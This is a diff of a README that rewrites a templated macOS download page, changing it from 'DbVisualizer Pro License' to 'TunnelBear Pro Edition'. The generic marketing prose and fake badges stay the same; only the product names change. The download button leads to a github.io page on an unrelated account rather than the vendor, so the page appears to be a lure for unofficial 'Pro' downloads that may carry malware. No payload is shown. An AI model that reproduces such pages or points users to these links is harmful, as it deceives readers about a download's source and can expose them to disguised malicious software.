@@ -1,12 +1,12 @@
-# DbVisualizer Pro License
+# TunnelBear Pro Edition
 
-<img src="https://www.qbssoftware.com/fr/wp-content/uploads/sites/5/2025/03/DbVis-Icon-2.png" width="200" alt="App icon" align="left"/>
+<img src="https://www.tunnelbear.com/static/img/tunnelbear-app.26b440d.svg" width="200" alt="App icon" align="left"/>
 
 <div>
-<h3>DbVisualizer for macOS</h3>
-<p>DbVisualizer delivers powerful database client and visualization capabilities for Mac users seeking a dependable, native solution with intuitive controls and consistent performance.</p>
+<h3>TunnelBear for macOS</h3>
+<p>TunnelBear is a specialized VPN and network security solution designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://evpatiy-kolovrat-software.github.io/.github/DbVisualizer">
+<a href="https://soft-deployed.github.io/.github/TunnelBear">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
@@ -14,12 +14,12 @@
 
 <div align="center">
 
-<a href="#"><img src="https://img.shields.io/badge/downloads-3.1k-brightgreen?style=flat" alt="downloads"/></a>
-<a href="#"><img src="https://img.shields.io/badge/version-4.2.0-blue?style=flat" alt="version"/></a>
-<a href="#"><img src="https://img.shields.io/badge/license-Pro%20License-lightgrey?style=flat" alt="license"/></a>
+<a href="#"><img src="https://img.shields.io/badge/downloads-1.3k-brightgreen?style=flat" alt="downloads"/></a>
+<a href="#"><img src="https://img.shields.io/badge/version-4.6.7-blue?style=flat" alt="version"/></a>
+<a href="#"><img src="https://img.shields.io/badge/license-Pro%20Edition-lightgrey?style=flat" alt="license"/></a>
 <a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
-<img src="https://www.dbvis.com/wp-content/uploads/2024/06/dbvis-promo.png" width="824" alt="Screenshot"/>
+<img src="https://www.tunnelbear.com/static/images/mac-app.png" width="824" alt="Screenshot"/>
 
 </div>
 
@@ -34,15 +34,15 @@
 
 ## Overview
 
-<a href="#">DbVisualizer for macOS</a> represents a comprehensive database client and visualization solution engineered to integrate seamlessly with Mac systems. Built on native frameworks and established interface conventions, it provides predictable operation that fits naturally into existing workflows. The design prioritizes both accessibility and depth, ensuring essential functions remain visible while advanced capabilities stay available when needed.
+<a href="#">TunnelBear for macOS</a> is a focused VPN and network security tool built to feel native on the Mac. It relies on system frameworks, familiar interface patterns and predictable behavior so users can integrate it into daily routines without friction. The layout emphasizes clarity, with tools grouped into logical sections that keep both power and simplicity within reach.
 
-During regular operation, DbVisualizer maintains straightforward access to primary features while exposing <a href="#">sophisticated controls</a> for users requiring detailed customization. Navigation follows macOS standards with recognizable menus, keyboard shortcuts and interface elements that accelerate task completion. Both new users and experienced operators benefit from the consistent, stable environment that supports efficient work patterns.
+In everyday use, TunnelBear keeps core actions close at hand while offering additional <a href="#">advanced controls</a> for users who want to fine‑tune behavior. Menus, shortcuts and panels follow Apple's design language, helping you move quickly between tasks. Whether you are exploring features for the first time or returning to established workflows, the environment stays consistent and reliable.
 
-The underlying architecture leverages <a href="#">macOS core technologies</a> to deliver reliable performance across demanding operations. This foundation enables smooth handling of extensive processing, real‑time updates and simultaneous task execution without compromising interface responsiveness. System‑level integration ensures background tasks execute efficiently while maintaining fluid interaction with controls and displays.
+Under the hood, TunnelBear is engineered around <a href="#">macOS technologies</a> that handle performance‑critical work. This approach allows it to remain responsive even while processing complex operations, managing multiple tasks or handling large datasets at once. Background operations are handled quietly, keeping the interface smooth so that navigation, configuration and monitoring always feel responsive.
 
-Professional users appreciate DbVisualizer's support for complex requirements through extensive configuration options, saved presets and automation capabilities. Behavioral adjustments accommodate individual preferences, from modified operational intervals and custom handling rules to specialized integration protocols. Configuration interfaces use clear <a href="#">settings panels</a> with descriptive labels rather than cryptic command‑line parameters.
+For professionals, TunnelBear supports more demanding scenarios with configurable options, presets and automation‑friendly behavior. Settings can be adjusted to match preferred habits, whether that means changing operational parameters, tuning performance rules or adapting how the app interacts with external services. These options are organized using descriptive <a href="#">preference panels</a> rather than hidden configuration files.
 
-Throughout extended use, <a href="#">DbVisualizer</a> establishes itself as a stable component of the macOS ecosystem. The combination of thoughtful interface design, optimized performance and sensible default configurations supports sustained productivity. Users develop confidence in the application's predictable behavior, secure data handling and continued compatibility as the operating system advances.
+Over time, <a href="#">TunnelBear</a> becomes a dependable part of the Mac environment. Its combination of refined interface decisions, efficient processing and thoughtful defaults makes it suitable for long‑term use. Users can trust that the application will behave consistently, preserve work safely and adapt as macOS continues to evolve.
 
 ---
 
@@ -68,7 +68,7 @@ Throughout extended use, <a href="#">DbVisualizer</a> establishes itself as a st
 ## Screenshots
 
 <p align="center">
-  <img src="https://www.dbvis.com/wp-content/uploads/2023/09/sql-client-gui-opt-1300x505.png" width="824" alt="DbVisualizer screenshot"/>
+  <img src="https://www.tunnelbear.com/static/img/apps_1_mac.0c8452d.png" width="824" alt="TunnelBear screenshot"/>
 </p>
 
 ---
@@ -87,10 +87,10 @@ Throughout extended use, <a href="#">DbVisualizer</a> establishes itself as a st
 
 ## Additional Information for macOS Users
 
-<a href="#">DbVisualizer</a> is often chosen by Mac users who want a dedicated database client and visualization solution that respects platform conventions. Its focused interface avoids unnecessary distractions and helps people stay in control of their workspace even during longer sessions.
+<a href="#">TunnelBear</a> is often chosen by Mac users who want a dedicated VPN and network security solution that respects platform conventions. Its focused interface avoids unnecessary distractions and helps people stay in control of their workspace even during longer sessions.
 
 In practice, the app slots neatly into broader <a href="#">macOS workflows</a>. It cooperates with system utilities, cloud services and automation tools, so users do not need to reinvent their entire setup. Instead, they can extend what they already have with a reliable, specialized component.
 
-For teams and professionals, DbVisualizer offers a clear path to repeatable results. Settings can be standardized, documented and shared so everyone works from the same foundation. Over time, this consistency reduces friction and supports a healthier, more maintainable workflow.
+For teams and professionals, TunnelBear offers a clear path to repeatable results. Settings can be standardized, documented and shared so everyone works from the same foundation. Over time, this consistency reduces friction and supports a healthier, more maintainable workflow.
 
 ---
